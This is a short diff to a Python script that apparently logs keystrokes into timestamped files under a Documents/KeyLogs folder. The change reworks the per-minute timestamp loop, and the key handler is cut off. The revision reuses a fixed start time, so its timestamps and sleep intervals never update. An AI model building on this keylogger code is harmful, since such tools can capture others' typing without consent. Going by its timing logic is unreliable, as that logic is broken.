@@ -8,8 +8,9 @@ import shutil
 log_folder = os.path.join(os.path.expanduser("~"), "Documents", "KeyLogs")
 os.makedirs(log_folder, exist_ok=True)
 
-now = datetime.now().strftime("%d-%m-%Y-%H.%M.%S")
-filename = os.path.join(log_folder, 'keys_' + now + '.txt')
+now = datetime.now()
+Now = now.strftime("%d-%m-%Y-%H.%M.%S")
+filename = os.path.join(log_folder, 'keys_' + Now + '.txt')
 Last_listen_filename = os.path.join(log_folder, 'Last_listen.txt')
 Current_listening_name = os.path.join(log_folder, 'listening.txt')
 Current_listening = []
@@ -24,10 +25,11 @@ def Show_listening():
 
 def timestemp_everyminute():
     while True:
-        timestemp = datetime.now().strftime("%d/%m/%Y-%H:%M:%S")
+        wait = 60 - now.second
+        timestemp = now.strftime("%d/%m/%Y-%H:%M:%S")
         with open(filename, "a", encoding='utf-8') as file:
             file.write(f'\n~{timestemp}:~\n')
-        time.sleep(60)
+        time.sleep(wait)
 
 def on_press(key):
     try:
